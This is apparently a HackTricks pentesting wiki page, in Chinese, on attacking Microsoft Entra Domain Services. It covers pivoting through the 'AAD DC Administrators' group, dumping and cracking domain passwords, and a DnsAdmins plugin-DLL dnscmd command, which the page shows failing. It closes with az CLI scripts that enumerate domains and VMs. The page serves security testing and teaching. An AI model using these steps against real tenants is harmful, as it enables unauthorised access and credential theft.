# Az - Microsoft Entra Domain Services

{{#include ../../../../banners/hacktricks-training.md}}

## Domain Services

Microsoft Entra Domain Services 允许在 Azure 中部署 Active Directory，而无需管理域控制器（实际上您甚至无法访问它们）。

其主要目标是允许您在云中运行无法使用现代身份验证方法的遗留应用程序，或者您不希望目录查找始终返回本地 AD DS 环境。

请注意，为了将 Entra ID 中生成的用户（而不是从其他活动目录同步的用户）同步到 AD 域服务，您需要**将用户的密码**更改为新密码，以便可以与新的 AD 同步。实际上，用户在密码更改之前不会从 Microsoft Entra ID 同步到域服务。

> [!WARNING]
> 即使您正在创建一个新的活动目录域，您也无法完全管理它（除非利用一些错误配置），这意味着默认情况下，例如您无法直接在 AD 中创建用户。您通过**从 Entra ID 同步用户**来创建它们。您可以指示同步所有用户（即使是从其他本地 AD 同步的用户）、仅云用户（在 Entra ID 中创建的用户），甚至**进一步过滤它们**。

> [!NOTE]
> 通常，由于新域配置的灵活性不足以及 AD 通常已经在本地的事实，这并不是 Entra ID 和 AD 之间的主要集成，但仍然值得了解如何妥协它。

### Pivoting

生成的 **`AAD DC Administrators`** 组的成员在与托管域关联的 VM 上被授予本地管理员权限（但不在域控制器上），因为他们被添加到本地管理员组中。该组的成员还可以使用**远程桌面远程连接到域加入的 VM**，并且也是以下组的成员：

- **`Denied RODC Password Replication Group`**：这是一个指定用户和组的组，其密码不能在 RODC（只读域控制器）上缓存。
- **`Group Policy Creators Owners`**：该组允许成员在域中创建组策略。然而，其成员无法将组策略应用于用户或组或编辑现有的 GPO，因此在此环境中并不那么有趣。
- **`DnsAdmins`**：该组允许管理 DNS 设置，并在过去被滥用以[提升权限并妥协域](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins)，然而在此环境中测试该攻击后发现该漏洞已被修补：
```text
dnscmd TDW52Y80ZE26M1K.azure.training.hacktricks.xyz /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
注意，为了授予这些权限，在AD中，**`AAD DC Administrators`** 组被添加为之前组的成员，并且GPO **`AADDC Computers GPO`** 将域组 **`AAD DC Administrators`** 的所有成员添加为本地管理员。

从Entra ID到使用域服务创建的AD的横向移动是直接的，只需将用户添加到 **`AAD DC Administrators`** 组中，通过RDP访问域中的任何/所有机器，您将能够窃取数据并且**妥协域。**

然而，从域到Entra ID的横向移动并不容易，因为域中的内容没有同步到Entra ID。然而，始终检查所有加入的VM的元数据，因为它们的分配的托管身份可能具有有趣的权限。同时**从域中转储所有用户密码**并尝试破解它们，以便登录到Entra ID / Azure。

> [!NOTE]
> 注意，在过去发现了其他漏洞，这些漏洞允许妥协DC，[像这个](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com)。妥协DC的攻击者可以非常轻松地保持持久性，而Azure管理员则未注意到或甚至无法移除它。

### 枚举
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.training.hacktricks.xyz?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../../banners/hacktricks-training.md}}
